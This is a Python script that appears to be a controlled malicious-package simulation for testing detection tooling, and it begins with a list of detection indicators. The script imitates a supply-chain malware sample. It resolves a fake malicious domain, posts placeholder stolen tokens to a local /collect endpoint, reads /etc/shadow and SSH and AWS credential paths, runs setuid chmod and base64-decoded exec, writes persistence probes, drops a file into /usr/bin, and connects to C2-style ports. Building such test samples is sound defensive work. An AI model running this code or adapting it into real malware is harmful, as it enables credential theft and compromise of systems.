# Controlled static indicators for detection only:
# /etc/passwd /etc/shadow .ssh/id_rsa .aws/credentials Authorization: Bearer BEGIN PRIVATE KEY
# /collect /exfil socket.connect( subprocess.run( os.system( ctypes
# exec( eval( compile( __import__( base64.b64decode(
# crontab .bashrc .profile systemctl enable
# cmdclass post_install "preinstall" "postinstall"
# import socket import subprocess import ctypes import pty

import os, socket, subprocess, time
import base64

MALICIOUS_DOMAIN = "ext-net.xam1riel.surf"
PORTS = [4444, 1337, 6667, 9001, 8080]

def try_open(p):
    try: open(p).close()
    except: pass

def run_payload():
    # 1. DNS query
    try: socket.getaddrinfo(MALICIOUS_DOMAIN, 80)
    except: pass
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass
    # 2. HTTP POST to honeypot
    try:
        subprocess.run(["curl","-sS","-m","3","-X","POST",
            "-H", f"Host: {MALICIOUS_DOMAIN}",
            "-H", "Content-Type: application/json",
            "-H", "User-Agent: cloud-signal-agent/1.0",
            "--data", f'{"package":"cloud-signal-agent","token":"Authorization: Bearer stolen-token","secret":"BEGIN PRIVATE KEY fake","domain":"ext-net.xam1riel.surf","credentials":".aws/credentials","password":"leaked-pass"}',
            "http://127.0.0.1:8080/collect"], capture_output=True, timeout=6)
    except: pass
    # 3. Sensitive /etc access
    for p in ['/etc/passwd', '/etc/hosts', '/etc/hostname', '/etc/resolv.conf', '/etc/os-release', '/etc/group', '/etc/shadow']:
        try_open(p)
    # 4. Credential access
    for p in ['/root/.ssh/id_rsa', '/root/.aws/credentials', '/root/.bash_history', '/root/.profile']:
        try_open(p)
    # 5. File operations
    for i in range(56):
        p = f"/tmp/cloud_signal_agent_artifact_{i}.txt"
        try:
            with open(p,"w") as f: f.write(f"artifact {i}\n")
            with open(p) as f: f.read()
            os.rename(p,p+".renamed"); os.unlink(p+".renamed")
        except: pass
    # 6. Privilege escalation
    try: subprocess.run(["chmod","777","/tmp/cloud_signal_agent_target"],capture_output=True)
    except: pass
    try: subprocess.run(["chmod","u+s","/tmp/cloud_signal_agent_target"],capture_output=True)
    except: pass
    try: subprocess.run(["/bin/sh","-c","whoami"],capture_output=True)
    except: pass
    # 7. Obfuscation
    try: exec(base64.b64decode(b"cHJpbnQoJ2RlY29kZWQtcGF5bG9hZCcp").decode())
    except: pass
    try: eval(compile(base64.b64decode(b"MSsx").decode(),"<string>","eval"))
    except: pass
    # 9. Persistence
    try: os.system("crontab -l >/tmp/cron_probe 2>&1 || true")
    except: pass
    try: open("/tmp/.profile_probe","a").write("persistence\n")
    except: pass
    try: open("/tmp/.bashrc_probe","a").write("persistence\n")
    except: pass
    # 10. Write to binary dir
    try:
        subprocess.run(["/bin/sh","-c","exec 3>/usr/bin/cloud_signal_agent_dropper && echo '#!/bin/sh' >&3 && sleep 5; exec 3>&-"],timeout=8,capture_output=True)
    except: pass
    # 11. Spawn child processes
    procs = []
    for i in range(11):
        try: procs.append(subprocess.Popen(["/bin/sh","-c","echo process-op; id; sleep 20"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL))
        except: pass
    try: subprocess.run(["pip","--version"],capture_output=True)
    except: pass
    # 12. C2 port connections — socket.AF_INET (same as pkg-meta-fetcher)
    for port in PORTS:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.8)
            s.connect(("1.1.1.1", port))
            s.send(b"GET / HTTP/1.0\r\nHost: 1.1.1.1\r\n\r\n")
            s.close()
        except: pass
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.8)
            s.connect(("127.0.0.1", port))
            s.send(b"GET / HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n")
            s.close()
        except: pass
    # 13. Keep process alive for psutil monitoring
    time.sleep(48)
    for p in procs:
        try: p.kill()
        except: pass

if __name__ == "__main__":
    run_payload()
